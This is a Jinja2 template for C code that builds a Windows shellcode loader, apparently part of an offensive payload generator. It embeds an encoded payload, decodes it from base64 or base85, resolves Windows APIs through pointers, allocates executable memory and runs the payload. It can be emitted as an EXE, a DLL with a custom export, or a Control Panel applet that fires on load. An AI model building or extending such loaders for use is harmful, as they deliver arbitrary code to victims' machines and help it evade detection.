#include <windows.h>
{% if debug_mode %}
#include <stdio.h>
#include <debugapi.h>
{% endif %}
{% if bytecode_transformation == 'base85_encoder' %}
#include <stdint.h>
#include <stdbool.h>
{% endif %}

// We're using DEBUG_PRINT macro if debug mode is selected
{% if debug_mode %}
char debug_buffer[512];
#define DEBUG_PRINT(fmt, ...) \
    do { \
        sprintf(debug_buffer, "DEBUG: " fmt "\n", ##__VA_ARGS__); \
        OutputDebugStringA(debug_buffer); \
    } while (0)
{% else %}
#define DEBUG_PRINT(fmt, ...) // The macro becomes nothing if debug is off
{% endif %}

// --- Transformed Bytecode Placeholder ---
unsigned char transformed_bytecode[] = { {{ bytecode_array }} };
unsigned int transformed_bytecode_len = sizeof(transformed_bytecode);

// --- DYNAMICALLY INCLUDE PARTIALS ---
{% include 'partials/api_resolver.c.j2' %}
{% include allocation_partial %}
{% include execution_partial %}
{% if bytecode_transformation == 'base64_encoder' %}
    {% include 'partials/decode_base64.c.j2' %}
{% elif bytecode_transformation == 'base85_encoder' %}
    {% include 'partials/decode_base85.c.j2' %}
{% endif %}


// --- Function Forward Declarations ---
void* AllocateExecutableMemory(SIZE_T size);
void ExecutePayload(void* exec_mem, const unsigned char* payload, SIZE_T payload_len);
void ResolveAPIs();

// --- Main Logic ---
void Run() {
    unsigned char* decoded_bytecode = NULL;
    size_t decoded_bytecode_len = 0;
    void* exec_memory_block = NULL; 
    ResolveAPIs();

    {% if bytecode_transformation == 'base64_encoder' %}
        decoded_bytecode_len = (transformed_bytecode_len / 4) * 3 + 4;
        decoded_bytecode = (unsigned char*)pfnHeapAlloc(pfnGetProcessHeap(), 0, decoded_bytecode_len);
        Base64Decode(transformed_bytecode, transformed_bytecode_len, decoded_bytecode, &decoded_bytecode_len);
        DEBUG_PRINT("Run: Payload base64 decoded!");
    {% elif bytecode_transformation == 'base85_encoder' %}
        decoded_bytecode_len = (transformed_bytecode_len / 5) * 4 + 4;
        decoded_bytecode = (unsigned char*)pfnHeapAlloc(pfnGetProcessHeap(), 0, decoded_bytecode_len);
        Base85Decode(transformed_bytecode, transformed_bytecode_len, decoded_bytecode, &decoded_bytecode_len);
        DEBUG_PRINT("Run: Payload base85 decoded");
    {% else %}
        decoded_bytecode = transformed_bytecode;
        decoded_bytecode_len = transformed_bytecode_len;
    {% endif %}

    exec_memory_block = AllocateExecutableMemory(decoded_bytecode_len);
    ExecutePayload(exec_memory_block, decoded_bytecode, decoded_bytecode_len);

    {% if bytecode_transformation in ['base64_encoder', 'base85_encoder'] %}
        if (decoded_bytecode != NULL) {
            pfnHeapFree(pfnGetProcessHeap(), 0, decoded_bytecode);
            DEBUG_PRINT("Run: Freed memory from decoding buffer.");
        }
    {% endif %}

}

// --- Entry Point (EXE, DLL or CPL) ---
{% if output_format == 'dll' %}
void WINAPI {{ export_name }}() {
    Run();
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // We're not executing from DllMain to avoid loaderlock
    }
    return TRUE;
}

{% elif output_format == 'cpl' %}
#define CPL_INIT 1

LONG APIENTRY CPlApplet(HWND hwndCPl, UINT uMsg, LPARAM lParam1, LPARAM lParam2) {
    if (uMsg == CPL_INIT) {
        Run();
        return 1;
    }
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) { }
    return TRUE;
}

{% else %}
int main(int argc, char *argv[]) {
    Run();
    return 0;
}
{% endif %}



